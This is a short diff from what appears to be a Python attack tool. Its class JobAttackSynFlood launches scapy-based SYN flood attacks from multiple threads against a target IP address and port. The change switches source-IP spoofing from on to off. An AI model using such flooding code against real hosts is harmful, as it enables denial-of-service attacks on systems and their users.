@@ -23,7 +23,7 @@ class JobAttackSynFlood(AbstractJob):
 
     def launch_attack_in_thread(self, thread_index: int):
         print('JobAttackSynFlood.launch_attack_in_thread(): Started thread ' + str(thread_index))
-        self.service_scapy.attack_syn_flood(self.target_ip_address, self.target_port, number_of_packets_to_send=12, size_of_packet=1024 * 10, spoof_source_ip=True)
+        self.service_scapy.attack_syn_flood(self.target_ip_address, self.target_port, number_of_packets_to_send=12, size_of_packet=1024 * 10, spoof_source_ip=False)
         print('JobAttackSynFlood.launch_attack_in_thread(): Finished thread ' + str(thread_index))
 
     def job_iteration(self):
